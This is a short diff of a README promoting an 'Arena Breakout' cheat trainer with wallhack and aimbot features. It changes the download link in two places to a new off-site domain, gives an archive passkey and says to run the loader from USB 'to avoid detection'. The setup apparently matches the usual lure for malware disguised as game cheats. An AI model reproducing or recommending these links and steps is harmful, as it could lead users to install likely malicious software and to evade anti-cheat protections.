@@ -9,7 +9,7 @@ Arena Breakout trainer with ESP wallhack, aimbot, triggerbot, no recoil, speed h
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -92,7 +92,7 @@ Arena Breakout: Infinite is a hardcore extraction shooter with realistic mechani
 
 ## 🔧 Installation / How to Use
 
-1. Download the latest release by clicking **[CLICK](https://gitappdown.top/)**.
+1. Download the latest release by clicking **[CLICK](https://gitappsdown.pro/)**.
 
 2. **IMPORTANT:** Copy loader to a USB stick — it must be run from USB to avoid detection.
 
